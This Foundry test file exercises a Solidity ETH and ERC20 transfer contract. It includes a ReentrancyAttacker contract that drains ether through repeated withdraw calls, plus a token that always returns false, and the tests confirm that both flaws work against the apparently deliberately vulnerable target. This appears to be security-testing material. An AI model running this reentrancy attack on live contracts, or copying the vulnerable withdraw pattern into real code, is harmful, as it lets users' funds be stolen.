// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "../src/Transfer.sol";

contract MockERC20 is ERC20 {
    constructor() ERC20("Mock Token", "MCK") {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract FalseReturnERC20 is ERC20 {
    constructor() ERC20("False Return Token", "FRT") {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }

    function transfer(address, uint256) public pure override returns (bool) {
        return false;
    }

    function transferFrom(address, address, uint256) public pure override returns (bool) {
        return false;
    }
}

contract ReentrancyAttacker {
    Transfer public immutable target;
    uint256 public reentered;

    constructor(Transfer target_) {
        target = target_;
    }

    function attack() external payable {
        target.deposit{value: msg.value}();
        target.withdraw(msg.value);
    }

    receive() external payable {
        if (address(target).balance >= 1 ether && reentered < 2) {
            reentered += 1;
            target.withdraw(1 ether);
        }
    }
}

contract TransferTest is Test {
    Transfer public transferContract;
    MockERC20 public token;
    FalseReturnERC20 public falseToken;
    address public owner;
    address public user1;
    address public user2;

    function setUp() public {
        owner = address(this);
        user1 = makeAddr("user1");
        user2 = makeAddr("user2");

        transferContract = new Transfer();
        token = new MockERC20();
        falseToken = new FalseReturnERC20();

        vm.deal(user1, 10 ether);
        vm.deal(user2, 10 ether);

        token.mint(user1, 1_000 ether);
        token.mint(address(transferContract), 500 ether);

        falseToken.mint(user1, 1_000 ether);
    }

    function testDepositAndWithdraw() public {
        vm.prank(user1);
        transferContract.deposit{value: 2 ether}();

        assertEq(transferContract.ethBalances(user1), 2 ether);

        vm.prank(user1);
        transferContract.withdraw(1 ether);

        assertEq(transferContract.ethBalances(user1), 1 ether);
    }

    function testTransferETH() public {
        vm.prank(user1);
        transferContract.deposit{value: 2 ether}();

        vm.prank(user1);
        transferContract.transferETH(user2, 1.5 ether);

        assertEq(transferContract.ethBalances(user1), 0.5 ether);
        assertEq(transferContract.ethBalances(user2), 1.5 ether);
    }

    function testTransferERC20From() public {
        uint256 amount = 100 ether;

        vm.startPrank(user1);
        token.approve(address(transferContract), amount);
        transferContract.transferERC20From(token, user1, user2, amount);
        vm.stopPrank();

        assertEq(token.balanceOf(user2), amount);
    }

    function testOwnerTransferERC20() public {
        uint256 amount = 50 ether;

        transferContract.transferERC20(token, user2, amount);

        assertEq(token.balanceOf(user2), amount);
    }

    function test_RevertWhen_ZeroDeposit() public {
        vm.prank(user1);
        vm.expectRevert("Zero amount");
        transferContract.deposit{value: 0}();
    }

    function test_RevertWhen_WithdrawMoreThanBalance() public {
        vm.prank(user1);
        transferContract.deposit{value: 1 ether}();

        vm.prank(user1);
        vm.expectRevert("Insufficient balance");
        transferContract.withdraw(2 ether);
    }

    function test_RevertWhen_TransferETHInsufficientBalance() public {
        vm.prank(user1);
        transferContract.deposit{value: 1 ether}();

        vm.prank(user1);
        vm.expectRevert("Insufficient balance");
        transferContract.transferETH(user2, 2 ether);
    }

    function testUncheckedReturnValueIssue() public {
        uint256 amount = 100 ether;

        vm.startPrank(user1);
        falseToken.approve(address(transferContract), amount);
        transferContract.transferERC20From(falseToken, user1, user2, amount);
        vm.stopPrank();

        assertEq(falseToken.balanceOf(user1), 1_000 ether);
        assertEq(falseToken.balanceOf(user2), 0);
    }

    function testWithdrawReentrancyIssue() public {
        vm.prank(user1);
        transferContract.deposit{value: 3 ether}();

        ReentrancyAttacker attacker = new ReentrancyAttacker(transferContract);
        vm.deal(address(attacker), 1 ether);
        attacker.attack{value: 1 ether}();

        assertEq(address(attacker).balance, 4 ether);
        assertEq(address(transferContract).balance, 1 ether);
    }
}
